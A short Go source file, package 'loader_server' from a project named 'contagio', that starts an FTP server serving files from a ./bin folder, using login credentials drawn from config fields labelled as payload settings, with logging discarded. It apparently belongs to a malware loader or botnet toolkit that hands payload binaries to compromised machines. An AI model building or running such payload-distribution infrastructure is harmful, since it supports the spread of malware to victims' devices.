package loader_server

import (
	"contagio/contagio/config"
	"fmt"
	"strconv"
	"strings"

	filedriver "github.com/goftp/file-driver"

	"github.com/goftp/server"
)

func StartFtp(c *config.Config) {
	port, _ := strconv.Atoi(strings.Split(c.FtpServer, ":")[1])
	var perm = server.NewSimplePerm("root", "root")
	opt := &server.ServerOpts{
		Factory: &filedriver.FileDriverFactory{
			RootPath: "./bin",
			Perm:     perm,
		},
		Hostname: strings.Split(c.FtpServer, ":")[0],
		Port:     port,
		Auth: &server.SimpleAuth{
			Name:     c.Payload.FtpLogin,
			Password: c.Payload.FtpPassword,
		},
		Logger: new(server.DiscardLogger),
	}

	s := server.NewServer(opt)
	fmt.Println("[contagio] Ftp server ready: " + config.ReadConfig(c.Wg).FtpServer)
	go func() {
		err := s.ListenAndServe()
		if err != nil {
			fmt.Println("[contagio] Ftp fatal error: " + err.Error())
			c.Wg.Done()
			return
		}
	}()
}
